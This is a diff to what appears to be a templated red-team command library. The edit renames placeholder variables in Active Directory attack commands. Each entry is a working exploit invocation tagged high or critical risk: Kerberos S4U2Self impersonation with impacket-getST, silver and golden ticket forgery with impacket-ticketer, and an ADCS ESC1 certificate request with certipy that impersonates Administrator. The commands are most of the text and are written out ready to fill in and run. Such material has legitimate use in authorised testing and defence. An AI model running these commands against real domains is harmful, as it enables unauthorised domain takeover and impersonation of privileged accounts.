@@ -212,7 +212,7 @@ impacket-getST -spn '{{SPN:str:cifs/dc01.corp.local}}' '{{DOMAIN:domain:corp.loc
 Impersonate user via S4U2Self.
 
 ```bash
-impacket-getST -impersonate '{{IMPERSONATE:str:Administrator}}' -spn '{{SPN:str:cifs/dc01.corp.local}}' '{{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:str:pass}}' -dc-ip {{DC_IP:ip:10.10.10.1}}
+impacket-getST -impersonate '{{TARGET_USER:str}}' -spn '{{SPN:str:cifs/dc01.corp.local}}' '{{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:str:pass}}' -dc-ip {{DC_IP:ip:10.10.10.1}}
 ```
 
 <!-- meta: risk=high | phase=exploit | tags=kerberos,s4u,delegation -->
@@ -267,7 +267,7 @@ KRB5_CONFIG=/tmp/krb5.conf KRB5CCNAME={{CCACHE:file:user.ccache}} evil-winrm -i 
 Forge service ticket via service account NT hash.
 
 ```bash
-impacket-ticketer -nthash {{SVC_NT:str:ef699384c3285c54128a3ee1ddb1a0cc}} -domain-sid {{SID:str:S-1-5-21-...}} -domain {{DOMAIN:domain:corp.local}} -spn {{SPN:str:MSSQLSvc/db01.corp.local}} -groups 1105 -user-id 500 {{IMPERSONATE:str:Administrator}}
+impacket-ticketer -nthash {{TARGET_NTHASH:str}} -domain-sid {{SID:str:S-1-5-21-...}} -domain {{DOMAIN:domain:corp.local}} -spn {{SPN:str:MSSQLSvc/db01.corp.local}} -groups 1105 -user-id 500 {{TARGET_USER:str}}
 ```
 
 <!-- meta: risk=critical | phase=exploit | tags=kerberos,silverticket -->
@@ -278,7 +278,7 @@ impacket-ticketer -nthash {{SVC_NT:str:ef699384c3285c54128a3ee1ddb1a0cc}} -domai
 Forge TGT using krbtgt NT hash.
 
 ```bash
-impacket-ticketer -nthash {{KRBTGT_NT:str:abc123...}} -domain-sid {{SID:str:S-1-5-21-...}} -domain {{DOMAIN:domain:corp.local}} {{IMPERSONATE:str:Administrator}}
+impacket-ticketer -nthash {{KRBTGT_NT:str:abc123...}} -domain-sid {{SID:str:S-1-5-21-...}} -domain {{DOMAIN:domain:corp.local}} {{TARGET_USER:str}}
 ```
 
 <!-- meta: risk=critical | phase=exploit | tags=kerberos,goldenticket -->
@@ -311,7 +311,7 @@ KRB5_CONFIG=/tmp/krb5.conf KRB5CCNAME={{CCACHE:file:user.ccache}} python3 winrme
 Request cert with SAN to impersonate.
 
 ```bash
-certipy req -u '{{USERNAME:str:user}}@{{DOMAIN:domain:corp.local}}' -p '{{PASSWORD:str:pass}}' -ca '{{CA:str:CORP-CA}}' -target {{DC_HOST:str:dc01.corp.local}} -template '{{TEMPLATE:str:VulnTemplate}}' -upn '{{IMPERSONATE:str:Administrator}}@{{DOMAIN:domain:corp.local}}'
+certipy req -u '{{USERNAME:str:user}}@{{DOMAIN:domain:corp.local}}' -p '{{PASSWORD:str:pass}}' -ca '{{CA:str:CORP-CA}}' -target {{DC_HOST:str:dc01.corp.local}} -template '{{TEMPLATE:str:VulnTemplate}}' -upn '{{TARGET_USER:str}}@{{DOMAIN:domain:corp.local}}'
 ```
 
 <!-- meta: risk=critical | phase=exploit | tags=kerberos,adcs,esc1 -->
